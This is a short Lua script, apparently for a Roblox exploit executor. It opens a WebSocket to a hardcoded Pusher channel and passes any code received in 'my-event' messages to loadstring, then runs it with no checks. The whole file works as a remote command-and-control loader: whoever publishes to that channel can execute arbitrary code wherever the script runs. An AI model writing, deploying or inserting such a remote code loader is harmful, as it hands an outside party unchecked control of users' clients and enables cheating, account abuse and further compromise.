local H = game:GetService("HttpService")
local L = loadstring
local W = WebSocket.connect("wss://ws-sa1.pusher.com/app/fd50bc17b3666a1abc96?protocol=7&client=js&version=7.0.3")

W.OnMessage:Connect(function(m)
    local d = H:JSONDecode(m)
    if d.event == "pusher:connection_established" then
        W:Send(H:JSONEncode({event = "pusher:subscribe", data = {channel = "my-channel"}}))
        warn("hi ws, ws: hi <- this means everything did fine!! :DDDD smile")
    elseif d.event == "my-event" then
        local p = H:JSONDecode(d.data)
        local f, e = L(p.msg)
        if f then task.spawn(f) end
    end
end)
